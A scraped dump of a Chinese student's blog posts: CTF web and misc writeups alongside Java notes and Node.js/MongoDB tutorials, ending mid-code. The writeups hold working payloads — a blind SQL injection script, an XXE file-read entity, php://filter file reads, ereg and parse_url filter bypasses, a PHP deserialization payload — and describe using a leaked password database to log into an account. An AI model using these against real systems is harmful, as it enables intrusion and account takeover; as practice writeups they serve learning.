http://wutongyu.info/about-php-screw-decode/ 关于php-screw 解密 按照这两篇文章里的内容配置好php_screw的加密和解密工具之后，可以解密之前下载的index.php.bak，然后内容是md5加密后的sql注入，解法可以参考这篇文章 关键的一行1$str=\"select password from users where password='\".md5($password,true).\"'\"; http://www.joychou.org/web/SQL-injection-with-raw-MD5-hashes.html dalao博客的其中一段 web 2看到源码里js文件夹是/XXE/，然后尝试发现是Blind XXE 需要一个自己的平台 这题没有做 贴两位师傅的payload 作者的出题思路 很多厂商在修xxe的时候经常直接过滤&lt;!ENTITY就认为安全了，其实不然 解题思路：这道题就是在过滤了&lt;!ENTITY的情况下实现xxe 构造payload，xxe.dtd文件内容： &lt;!ENTITY xxe SYSTEM “file:///flag”&gt; web 3社工题目 首先是个黑页，留了个QQ号 直接放QQ里搜索，可以查到一个 sonic monkey 账户空间没有设权限，进入空间从一堆 动态中找到一条base64编码的说说 解码后My Page : http://47.93.205.124:8001/ 是一个个人主页的地址，访问是猴子的小金库，御剑扫一扫，发现后台 http://47.93.205.124:8001/manage_login.php首页文章发表者就是用户名 sonic2011 右键查看源代码，发现页脚处留有邮箱 sonic@163.com 联想163用户密码泄露事件 社工库 帐号密码到手 用户：sonic2011 密码：019157f2299755ad90a3bb8473f8**** md5最后四位填充0-f任意即 可，eg:019157f2299755ad90a3bb8473f81111 再md5解密一波得密码 2010sonic 登陆得到flag web 4题目给的链接是http://39.106.13.2/web2/file.php?file=index 想到利用php://filter来读取文 件，然后源码里有提示check.php，用http://39.106.13.2/web2/file.php?file=php://filter/ read=convert.base64-encode/resource=check.php 得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phperror_reporting(0);$_POST=Add_S($_POST);$_GET=Add_S($_GET);$_COOKIE=Add_S($_COOKIE);$_REQUEST=Add_S($_REQUEST);function Add_S($array)&#123; foreach($array as $key=&gt;$value)&#123; if(!is_array($value))&#123; $check= preg_match('/regexp|like|and|\\\"|%|insert|update|delete|union|into|load_file|outfile|\\/\\*/i', $value); if($check) &#123; exit(\"Stop hacking by using SQL injection!\"); &#125; &#125;else&#123; $array[$key]=Add_S($array[$key]); &#125; &#125;return $array;&#125;function check_url()&#123; $url=parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); $key_word=array(\"select\",\"from\",\"for\",\"like\"); foreach($query as $key) &#123; foreach($key_word as $value) &#123; if(preg_match(\"/\".$value.\"/\",strtolower($key))) &#123; die(\"Stop hacking by using SQL injection!\"); &#125; &#125; &#125;&#125;?&gt; 在http://39.106.13.2/web2/article_show_All.php?a_id=1得到注入点 可以看到check.php是过滤了大部分SQL注入关键字，尤其是连select、from都过滤了，看起来非常难注入。但其实 能看出这个check.php写的很不自然，明明一个过滤就可以，但却写了两个函数，于是猜测问题可能出在下面那个函 数上。下面那个函数是用parse_url()来取请求中的参数，于是猜测这个函数会不会有漏洞 chu师傅的博客上有 parse_url()的漏洞 http://sh3ll.me/archives/201611031132.txt http://mxny.org/post/ctf/2016-11-10 麦香师傅放入博客也有讲 parse_url这个函数可以用////绕过 union被上面的函数过滤掉了，所以这里不能用联合查询。但我们还是可以利用a_id=1和a_id=0的返回值不同来进行 bool注入 盲注脚本 12345678910111213import requestsurl = 'http://39.106.13.2///web2/article_show_All.php'get = \"\"for i in xrange(32): for j in xrange(32, 127): payload = \"0'^(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()), \" + str(i) + \", 1))=\" + str(j) + \")#\" param = &#123;'a_id': payload&#125; r = requests.get(url, parmas = param) if 'flag' in r.content: get += chr(j) print get break","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"},{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"java基础","slug":"java基础","date":"2017-10-28T03:04:08.000Z","updated":"2017-11-19T15:08:01.767Z","comments":true,"path":"2017/10/28/java基础/","link":"","permalink":"http://Merl1ng.com/2017/10/28/java基础/","excerpt":"正在看java但是和目前在用的c有些相似 怕记混开坑记录一下java和c的一点区别 但是在此之前我Cao 必须吐槽下今早的数学竞赛","text":"正在看java但是和目前在用的c有些相似 怕记混开坑记录一下java和c的一点区别 但是在此之前我Cao 必须吐槽下今早的数学竞赛 由于要到外地比赛 尼玛不到六点就滚起来了 七点多一点开到高速路口结果因为大雾封路??? Exuse me??? 本来都凉了 堵到九点那边考场开考了说只要结束前进去就行 又有了点希望 BUT 还是太堵九点半又原路返回了………….. wtf! 高速路半日游还真是丰富了我的人生阅历 就不能提前看下天气预报 准备个应急方案吗 有些dalao复习了好久就因为这 总共200多号人连卷子都没看到 还有一些大三的学长最后一次机会却没能去成 真是亏我昨天复习了一天(好吧我本来是想混个三等的) Orz… —————————————————————————————–正文部分—————————————————————————————– java0x01java里的数组名字只是个管理者 不同于c中的首地址 12345int[] a = new int[10];a[0]=5;int[] b = a;b[0] = 16;System.out.println(a[0]);//println输出自带换行 这时a[0]也是16 因为此时a与b管理同一个数组 改变任意一个另一个也会变 0x02遍历数组可用 for-each循环 int k : data 对数组data中每一个元素 按顺序每次拿一个作为k 不能修改数组 0x03int[] data = new int [10]不但生成了数组并且每个元素被初始化为0 0x04数组长度 data.length 若是二维数组 data.length表示行数 data[i].length 表示每行有几个(列数) 0x05Math类提供基本数学操作 Math.sqrt(x) 算立方根 Math.round 对小数进行四舍五入 Math.random 0-1 之间的一个随机数 0x06包裹类型 bollean Bollean char Character int Integer double Double 有一些特殊功能 Integer.MAX_VALUE Interger.MIX_VALUE 获取该类型的最大最小值 Character有更多 0x07String 字符串变量 首字母大写 如同包裹类型一样 他是一个类 String a a只是管理者 0x08比较两个String x为字符串变量的变量名 x==”xxx” 比较是否是同一个(管理者)x.equals(“xxx”) 比较内容是否相同 0x09所有的字符串都是不可变的 对它们的操作的结果都是制造新的字符串出来 0x0A一个.java文件是一个编译单元 public类必须与这个编译单元同名 一个编译单元里最多只有一个public类 0x0Bfriendy 在同一个包里可访问 0x0Cstatic关键字 类变量 类函数 一些在学java中了解到的其它方面\\b\\t\\b \\t是一个制表符，\\b是代表一个退格，但一个制表符会被识别为一个字符，因此一个\\b会消除一个制表符，虽然它实际上是很多空格 \\b表示将输出位置左移一位。printf(“abc\\bd”); 这个将输出：abd原因是先输出abc，这时输出位置在c后面，接着输出\\b，将输出位置移到c上，再输出d时，d将c覆盖了，因此输出：abd printf(“abc\\b”); 这个将输出：abc 本身没有删除作用 ASCII，Unicode 和 UTF-8http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html 阮一峰大大这篇写的通俗易懂 里面再次提到了之前密码学里面记录过的 Little endian 和 Big endian 小头大头存储方式 这两个古怪的名称来自英国作家斯威夫特的《格列佛游记》。在该书中，小人国里爆发了内战，战争起因是人们争论，吃鸡蛋时究竟是从大头(Big-endian)敲开还是从小头(Little-endian)敲开。为了这件事情，前后爆发了六次战争，一个皇帝送了命，另一个皇帝丢了王位 hhh 打开”记事本”程序notepad.exe，新建一个文本文件，内容就是一个严字，依次采用ANSI，Unicode，Unicode big endian和UTF-8编码方式保存 然后，用文本编辑软件UltraEdit 中的”十六进制功能”，观察该文件的内部编码方式 1）ANSI：文件的编码就是两个字节D1 CF，这正是严的 GB2312 编码，这也暗示 GB2312 是采用大头方式存储的 2）Unicode：编码是四个字节FF FE 25 4E，其中FF FE表明是小头方式存储，真正的编码是4E25 3）Unicode big endian：编码是四个字节FE FF 4E 25，其中FE FF表明是大头方式存储 4）UTF-8：编码是六个字节EF BB BF E4 B8 A5，前三个字节EF BB BF表示这是UTF-8编码，后三个E4B8A5就是严的具体编码，它的存储顺序与编码顺序是一致的 UTF-8是Unicode的实现方式之一 http://www.cnblogs.com/yuguangchuan/p/4310952.html 这篇也可以看看 http://www.qianxingzhem.com/post-1499.html 这篇比较了ANSI、GBK、GB2312、UTF-8、GB18030和 UNICODE","categories":[{"name":"java","slug":"java","permalink":"http://Merl1ng.com/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://Merl1ng.com/tags/java/"}]},{"title":"mongoose基础及cms后端","slug":"mongoose基础及cms后端","date":"2017-10-15T15:44:47.000Z","updated":"2017-10-24T16:09:13.787Z","comments":true,"path":"2017/10/15/mongoose基础及cms后端/","link":"","permalink":"http://Merl1ng.com/2017/10/15/mongoose基础及cms后端/","excerpt":"mongoose","text":"mongoose mongodb无模式 但有时有需求 使用mongoose的数据库操作对 Schema: 一种以文件形式存储的数据库模型骨架，不具备数据库的操作能力 Model: 由Schema发布生成的模型，具有抽象属性和行为 Entity: 由Model创建的实体，它的操作也会影响数据库 Schema生成Model,Model创造Entity,Model和Entity都可对数据库操作造成影响，但Model比Entity更具操作性 sublime text ctrl+?可以取消or增加注释 model.js //配置与连接12345var mongoose = require('mongoose');var uri = 'mongodb://username:password@hostname:poot/databasename';或者 uri=\"mongodb://localhost/文件夹名字\"mongoose.connect(uri); model 连接 js中的对象和mongodb中的文档 操作mongodb可以增改删查文档 schema实现model中数据类型和结构的定义 无模式中实现模式化存储 12345678910111213var mongoose = require('mongoose');var uri = 'mongodb://username:password@hostname:poot/databasename';或者 uri=\"mongodb://localhost/文件夹名字\"mongoose.connect(uri);var BookSchema = new mongoose.Schema(&#123; name: String, author: String, publishTime: Date&#125;);mongoose.model('Book',BookSchema)//给model命名时第一个字母最好大写 insert.js//创建新的12345678910111213141516var mongoose = require('mongoose');require('./model.js');var Book = mongoose.model('Book');var book = new Book(&#123; name: \"MEAN Web Development\", author: \"Green\", publishTime: new Data()//设置为当前时间&#125;);book.author = 'Jim';book.save(function()&#123;console.log('save stauts',err ? 'failed' : 'success');&#125;); find.js//查询1234567891011121314var mongoose = require('mongoose');require('./model.js);var Book = mongoose.model('Book');Book.find(&#123;&#125;,function(err,docs)&#123; if(err)&#123; console.log('err:', err); return; &#125; console.log('result',docs);&#125;);//&#123;&#125;为空查询所有 findone.js//只返回第一满足条件的123456789101112131415`var mongoose = require('mongoose');require('./model,js');var Book = mongoose.model('Book');Book.findOne(&#123;author:\"Jim\"&#125;,function(err,doc)&#123; if(err)&#123; console.log('err',err); return; &#125; doc.author = 'Jame';//可以直接在这修改 doc.save();// console.log('findOne result: ',doc);&#125;); remove.js12345678910111213141516var mongoose = require('mongoose');require('./model.js');var Book = mongoose.model('Book');Book.findOne(&#123;author: 'Jim'&#125;,function(err,doc)&#123; if(err)&#123; console.log('findOne err:', err); return; &#125; if(doc)&#123; doc.remove(); &#125;&#125;); condition.js//条件 以 find为例1234567891011121314151617181920var mongoose = require('mongoose');require('./model.js);var Book = mongoose.model('Book');var cond = &#123; $or: [ &#123;author: 'Jame'&#125;, &#123;author: 'Jim'&#125; ]&#125;;Book.find(cond,function(err,docs)&#123; if(err)&#123; console.log('find by cond err:', err) return; &#125; console.log('cond:', cond,'result:', docs);&#125;); 在express中使用用express新建项目 新建 config文件夹 新建 config.js 123module.exports = &#123; mongodb: \"mongodb://localhost/文件夹名\"&#125;; 同一目录下新建mongoose.js 12345678var mongoose = require('mongoose');var config = require('./config.js');model.exports = function()&#123; var db = mongoose.connect(config.mongodb); return db;&#125;; 在models目录下新建 user.server.model.js 12345678910var mongoose = require('mongoose');var UserSchema = new mongoose.Schema(&#123; uid: Number, username: String, createTime: Date, loastLogin: Date&#125;);mongoose.model('User',UserSchema); 修改 mongoose.js 做相应引用 123456789var mongoose = require('mongoose');var config = require('./config.js');model.exports = function()&#123; var db = mongoose.connect(config.mongodb); require('../model/user.server.model.js'); return db;&#125;; 把mongoose的配置加入应用在 app.js中加入 123var mongoose = require('./config/mongoose,js');var db = mongoose(); CMS后端实现项目的初始化npm init 根据提示输入参数 建立package.json文件 入口设置为 bin/www 与默认生成的保持一致 项目结构创建 bin文件夹 config文件夹 app文件夹(放后端文件) config文件夹内 创建 env环境变量目录 在 env下创建 development.js文件 123`module.exports = &#123; port: 7101;&#125; 在 config文件夹下 创建config.js文件 读取环境变量 通过设置不同的env可以读取不同的配置文件 123456789var config = null;if(process &amp;&amp; process.env &amp;&amp; process.env.NODE_ENV)&#123; config = require('./env/' + process.env.NODE_ENV + '.js');&#125; else&#123; config = require('./env/development.js');&#125;module.exports = config; 在 config文件夹下创建 express.js文件 123456789101112131415161718192021222324252627282930var express = require('express');var bodyParser = require('body-parser');module.exports = function()&#123; console.log('init express...'); var app = express(); app.use(bodyParser.json()); app.use(function(req,res,next)&#123; res.status(404); try &#123; return res.json('Not Found'); &#125; catch(e)&#123; console.error('404 set header after sent'); &#125;&#125;); app.use(function(err,req,res,next)&#123; if(!err)&#123;return next()&#125; res.status(500); try&#123; return res.json(err.message || 'server error'); &#125; catch(e)&#123; console.error('500 set header after sent'); &#125;&#125;); return app;&#125;; 老的express的系统入口是app.js 所以保留了这个 在根目录下创建 app.js 12345var expree = require('./config/express');var app = expree();module.exports = app; 在 bin文件夹下创建 www 文件 123456var app = require('../app');//类似app.js 扩展名可以省掉var config = require('../config/config');app.listen(config.port, function()&#123; console.log('app started, listening on port',config.port);&#125;); 安装相应模块 npm install express –savenpm install body-parser –save 启动 nodemon bin/www 访问 curl http://localhost:7101 api实现app文件夹下创建 controllers文件夹 models文件夹 routes文件夹 在 models文件夹内创建 news.server.model.js 123456789var mongoose = require('mongoose');var NewSchema = new mongoose.Schema(&#123; title: String, content: String. createTime: &#123;type: Date, default: Date.now&#125;&#125;);var News = mongoose.model('News',NewsSchema);//News为模型名 在 config下env下 创建 mongoose.js 12345678910var mongoose = require('mongoose');var config = require('./config');module.exports = function()&#123; var db = mongoose.connect(config.mongodb); require('../app/model/news.server.model');return db;&#125;; 修改 development.js文件 123module.exports = &#123; port: 7101, mongodb: 'mongodb://localhost/生成项目时的项目名' 修改 app.js文件 1234567var express = require(./config/express);var mongodb = require('./config/mongoose');var db = mongodb();var app = express();module.exports = app; 在 app文件夹下 controllers文件夹下创建 news.server.controller.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344var mongoose = require('mongoose');var News = mongoose.model('News');model.export = &#123; create: function(req,res,next)&#123; var news = new News(req.body); news.save(function(err)&#123; if(err) return next(err); return res.json(news); &#125;); &#125;, list: function(req,res,next)&#123; var pagesize = parseInt(req.query.pagesize,10) || 10; var pagestart = parseInt(req.query.pagestart,10) || 1; News .find() .skip( (pagestart - 1)*pagesize ) .limit(pagesize) .exex(function(err,docs)&#123; if(err) return next(err); return res.json(docs); &#125;); &#125;, getById: function(req,res,next,id)&#123; if(!id) return next(new Error('News not Found')); News .findOne(&#123;_id: id&#125;) .exec(function(err, doc)&#123; if(err) return next(err); if(doc) return next(new Error('News not Found')); req.news = doc; return next(); &#125;);&#125;, get: function(req,res,next)&#123; return res.json(req.news); &#125;&#125;; 在routes文件夹下 创建news.server.routes.js 12345678910111213var NewsController = require('../controllers/news.server.controller');model.exports = function(app)&#123; app.route('/news') .get(NewsController.create); .post(NewsController.create);&#125;; app.route('/news/:nid') .get(NewsController.get); app.param('nid', NewsController.getById);&#125;; 修改 express.js文件 1234567891011121314151617181920212223242526272829303132var express = require('express');var bodyParser = require('body-parser');module.exports = function()&#123; console.log('init express...'); var app = express(); app.use(bodyParser.json()); require('../app/routes/news.server.routes')(app);//新加的 app.use(function(req,res,next)&#123; res.status(404); try &#123; return res.json('Not Found'); &#125; catch(e)&#123; console.error('404 set header after sent'); &#125;&#125;); app.use(function(err,req,res,next)&#123; if(!err)&#123;return next()&#125; res.status(500); try&#123; return res.json(err.message || 'server error'); &#125; catch(e)&#123; console.error('500 set header after sent'); &#125;&#125;); return app;&#125;; npm install mongoose –save 访问 curl http://localhost:7101/news 以POST方式提交数据 curl -X POST -H ‘Content-Type: application’ -d ‘{“title”: “test title”,”content”: test content}’ localhost:7101/news 小结大概一周的时间了解了一下node项目的基础 但是实验室的项目需求刚刚变成java 刚学的这方面暂时用不到了23333 但是还是手动跟着讲解视频敲完了代码 以后如果有遇到node.js的 方便温习","categories":[{"name":"node.js","slug":"node-js","permalink":"http://Merl1ng.com/categories/node-js/"}],"tags":[{"name":"express","slug":"express","permalink":"http://Merl1ng.com/tags/express/"},{"name":"mongodb","slug":"mongodb","permalink":"http://Merl1ng.com/tags/mongodb/"},{"name":"mongoose","slug":"mongoose","permalink":"http://Merl1ng.com/tags/mongoose/"}]},{"title":"express+mongodb极简入门","slug":"express-mongodb极简入门","date":"2017-10-13T14:53:42.000Z","updated":"2017-10-22T14:22:52.349Z","comments":true,"path":"2017/10/13/express-mongodb极简入门/","link":"","permalink":"http://Merl1ng.com/2017/10/13/express-mongodb极简入门/","excerpt":"安装 mongodb安装后加入环境变量方便启动","text":"安装 mongodb安装后加入环境变量方便启动 启动数据库需要以管理员身份运行 配置好后直接 net start MongoDB 首先新建数据表 cmder下 依次输入 mongouse blog //创建名为blog的数据库db.users.insert({“name”:”petr”,”age”:”26”,”level”:”master”});//创建名为users的集合(数据表)db.users.find();//查看数据 还有db.users.drop();//删除当前数据表若想以数字形式操作 数字不加”” 如 “number”:0 mongodb基础操作使用BSON储存数据 即二进制的JSON 无模式 支持索引 mongo 或指定服务器和端口 mongo 127.0.0.1:27017 show dbs 查看数据库 use 某一数据库后 可以 show collections 查看集合 db.users.find().count(); 查看数量 db.users.find({“_id” : ObjectId(“55bdxxxxxxxxxxxxxxx”)}); 通过_id条件查询 db.users.update() 更新数据 三个参数 条件 更新的内容 (配置) db.users.update({“username” : “Zoe”},{$set: {“group”: “writer”}});此时只改满足条件的第一个 db.users.update({“username” : “Zoe”},{$set: {“group”: “writer”}}，{multi: true});此时全改 db.users.save({_id: ObjectId(“5xxxxxxxxxxxxxxxxxxx”),”group” : “programmer”});必须有_id参数才能使用 但此时其他未指定的参数全部默认删除 db.users.remove({“group”: “reporter”}); 把所有符合条件的全删了 db.users.remove({“group”: “reporter”},true); 只删满足条件的第一个 db.users.remove({});只删文档 不删索引 db.users.drop();删所有 安装 express+Mongoose//全局安装expressnpm install express -g //安装express全局生成器，可以自动生成项目文件npm install express-generator -g 下面在当前工作目录生成一个叫做blog的项目，并采用ejs模版 // 默认是jade模版， -e就是采用ejs模版 express帮我们创建了一个完整的项目级目录express -e blog //进入项目文件夹cd blog //安装所有依赖npm install npm start//启动 //安装Mongoose, –save把Mongoose模块加入到项目依赖npm install mongoose –save 可以看到生成项目的目录 www文件就是启动文件 node_modules 存放所有项目的依赖 public为静态资源存放目录，可以修改 routes为路由文件 views就是视图了（页面文件，ejs模板） express操作mongodb修改routes/index.js 12345678910111213141516171819202122232425var express = require('express');//node语法，意思是引用依赖Express。我们将其保存成变量，以备之后的需要var router = express.Router();//mongodbvar mongoose = require('mongoose');mongoose.Promise = global.Promise; var conn = mongoose.connect('mongodb://127.0.0.1:27017/blog');var User = new mongoose.Schema(&#123;//使用mongoose name: String, age: String, level: String&#125;);var myModel = conn.model('user', User);/* GET index listing. */router.get('/', function(req, res, next) &#123; myModel.findOne(&#123;name:\"petr\"&#125;, function (err, user) &#123; console.log(user); res.render('index', &#123;title: 'Express', user: user &#125;); &#125;);&#125;);module.exports = router; 修改wiew/index.ejs 12345678910111213&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel='stylesheet' href='/stylesheets/style.css' /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;姓名：&lt;%= user.name %&gt;&lt;/p&gt; &lt;p&gt;年龄：&lt;%= user.age %&gt;&lt;/p&gt; &lt;p&gt;等级：&lt;%= user.level %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 启动服务器即可看到效果 另外一个入门项目本来是想单独整理出来的 但是原作者真的写得很细致了 看原版就很舒服~ 这个项目没有用express自动生成项目目录 而是手工完成 可以更好地理解每个部分的原理 http://www.jianshu.com/p/b4256fb0847a 作者的地址 不但写得很细致 并且告诉了各个部分的原理 不过有些地方代码有些小错误 需要自己改正或补全 通过一些案例也理解了一些使用文档型数据库mongodb搭配node的优点和它对JavaScript和Json的原生支持 这个小项目完成后效果是这个样子的 数据库里刚开始放的是 { “_id” : ObjectId(“59e230943339db05b4c01d74”), “clicks” : 0 } 注意如果手动insert 0不要带”” 一开始就因为这里报错了没成功 这个项目的目标是 记录按钮被按下的次数 在数据库中储存 重新设置计数为0 在程序的内容中，我们要做到以下： Node/Express网站服务用来响应HTTP要求，以及传文件给浏览器 MongoDB数据库用来存储点击的次数 服务端controller(控制器)可以添加，可以重设，可以接受来自数据库的记录 数据将会传给API 客户端控制器使用暴露的API能够根据用户的输入响应不同的内容 客户端能都给用户显示界面 HTML页面要包含一个logo以及用户交互的按钮","categories":[{"name":"node.js","slug":"node-js","permalink":"http://Merl1ng.com/categories/node-js/"}],"tags":[{"name":"express","slug":"express","permalink":"http://Merl1ng.com/tags/express/"},{"name":"mongodb","slug":"mongodb","permalink":"http://Merl1ng.com/tags/mongodb/"}]},{"title":"世安杯writeup","slug":"世安杯writeup","date":"2017-10-08T14:49:53.000Z","updated":"2017-10-22T16:03:19.311Z","comments":true,"path":"2017/10/08/世安杯writeup/","link":"","permalink":"http://Merl1ng.com/2017/10/08/世安杯writeup/","excerpt":"原题蛮多的 web和misc做了点 然后就滚去写物理报告了..","text":"原题蛮多的 web和misc做了点 然后就滚去写物理报告了.. web 1找到源码 12345678910111213141516171819202122232425&lt;?php$flag = '*********';if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) echo '&lt;p class=\"alert\"&gt;You password must be alphanumeric&lt;/p&gt;'; else if (strpos ($_GET['password'], '--') !== FALSE) die($flag); else echo '&lt;p class=\"alert\"&gt;Invalid password&lt;/p&gt;';&#125;?&gt;&lt;section class=\"login\"&gt; &lt;div class=\"title\"&gt; &lt;a href=\"./index.phps\"&gt;View Source&lt;/a&gt; &lt;/div&gt; &lt;form method=\"POST\"&gt; &lt;input type=\"text\" required name=\"password\" placeholder=\"Password\" /&gt;&lt;br/&gt; &lt;input type=\"submit\"/&gt; &lt;/form&gt;&lt;/section&gt;&lt;/body&gt;&lt;/html&gt; 直接?password[]=就能绕过 也可以利用%00截断ereg，构造?password=1%00– 因为ereg函数存在NULL截断漏洞 导致了正则过滤被绕过 stropos()不受影响 web 2cookie 两句关键代码if(isset($_COOKIE[‘key’]) &amp;&amp; $_COOKIE[‘key’]==’li_lr_480’){ thisis_flag.php 把thisis_flag.php base64加密后和cookie一起替换 web 3综合题目 123456789101112&lt;?phpclass Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return \"__toString was called!\"; &#125;&#125;?&gt; 1234567891011121314151617181920212223242526272829&lt;?php$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/f1a9/\",$file))&#123; exit(); &#125;else&#123; include($file); //class.php $pass = unserialize($pass); echo $pass; &#125;&#125;else&#123; echo \"you are not admin ! \";&#125;$user = $_GET[\"user\"];$file = $_GET[\"file\"];$pass = $_GET[\"pass\"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"the user is admin\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //class.php&#125;else&#123; echo \"you are not admin ! \";&#125;?&gt; misc 1提示 low -&gt; lsb 先利用ps把bmp格式另存为 png 然后stegsolve即可拿到二维码 misc 2斑马 直接在线扫条形码 misc 3图片隐写 找到二维码 扫描得到一串十六进制数 查一下最开头几位 发现是pyc文件 winhex另存为timu.pyc 然后pyc反编译(这个库之前做题安装过) uncompyle2 -o 1.py timu.pyc misc 4文件倒置 winhex打开发现最开始是D9FF 最末尾是D8FF 反过来FF8D FF9D 就是jpg文件的文件头和文件尾 先新建一个a空文件 f=open(‘b’,’wb’)f.write(open(‘a’,’rb’).read()[::-1]) misc 5这题 无力吐槽 珍妮换了一个新的QQ号码，原来的号码和新的号码都是5位靓号哦；其次，新的号码是原来号码的4倍，并且原来的号码倒着写正好是新的号码，请问，新号码是多少，新号码即为key 掏出c语言打一发 87912 misc6拼接二维码 这题是别人的writeup 我本来以为是图片大小被修改没显示 后来才发现 少的地方刚好是三块回型的块23333","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"},{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"}]},{"title":"php代码审计Ⅲ","slug":"php代码审计Ⅲ","date":"2017-10-04T09:25:49.000Z","updated":"2017-10-05T05:27:51.630Z","comments":true,"path":"2017/10/04/php代码审计Ⅲ/","link":"","permalink":"http://Merl1ng.com/2017/10/04/php代码审计Ⅲ/","excerpt":"如何学习php? 打ctf…","text":"如何学习php? 打ctf… 综合题目12345678910$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 首先利用 file_get_contents结合php://input 加上 include($file)文件包含 拿到下一步的base64加密过的代码 (太长了没截完) 解密后是这个样子的 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 发现了经典的__toString事件，但是没有触发的条件 index.php应该还藏着东西，于是查看得到 1234567891011121314151617181920212223242526272829303132&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; 就是输出反序列化的时候会触发__toString属性 构造 password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;} (O因为Flag是对象)(Flag后面的数字我目前的理解是分号个数除以二) 这时就别再php://filter读文件源码了 包含进去就行 (file=hint.php) 查看源码拿到flag php反序列化漏洞http://blog.csdn.net/qq_32400847/article/details/53873275 __toStringhttp://www.jb51.net/article/99351.htm 正则表达式12345678 &lt;?php highlight_file('2.php');$key='KEY&#123;********************************&#125;';$IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match);if( $IM )&#123; die('key is: '.$key);&#125;?&gt; 1234567891011121314151617181920212223241./是正则表达式分界符，两个/里面的内容是正则表达式 表达式直接写出来的字符串直接利用，如key2.\".\"匹配除换行符 \\n 之外的任何单字符3.\"*\"匹配前面的子表达式零次或多次。例如，zo* 能匹配 \"z\" 以及 \"zoo\"。* 等价于&#123;0,&#125;合起来.*代表贪婪匹配 如下面的表达式匹配从开始小于符号 (&lt;) 到关闭 H1 标记的大于符号 (&gt;) 之间的所有内容。/&lt;.*&gt;/4.\"\\/\"代表\"/\" 表示将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， 'n' 匹配字符 'n'。'\\n' 匹配换行符。序列 '\\\\' 匹配 \"\\\"，而 '\\(' 则匹配 \"(\"5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号7./i代表大小写不敏感叫做修正符 更多看这篇http://www.cnblogs.com/kevin-yuan/archive/2012/09/25/2702167.html8.&#123;4-7&#125;代表[0-9]中数字连续出现的个数是4-7个 顺带一提与 * 区别的是 + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,} 构造方式有很多?id=keyakey1236key:/a/keya$","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"php","slug":"php","permalink":"http://Merl1ng.com/tags/php/"}]},{"title":"php代码审计Ⅱ","slug":"php代码审计Ⅱ","date":"2017-10-04T08:47:31.000Z","updated":"2017-10-04T11:12:21.995Z","comments":true,"path":"2017/10/04/php代码审计Ⅱ/","link":"","permalink":"http://Merl1ng.com/2017/10/04/php代码审计Ⅱ/","excerpt":"写在一起看的时候不方便 所以又开了一篇","text":"写在一起看的时候不方便 所以又开了一篇 挺杂的一道右键源码 提示1p.html 但是输进去会跳转到别的网页 所以要么burp抓包 要么先在别的页面查看源码 在源码页面里输入网址 可看到加密过的代码 先 base64再urldecode 得到源码 1234567891011121314151617181920212223242526&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and 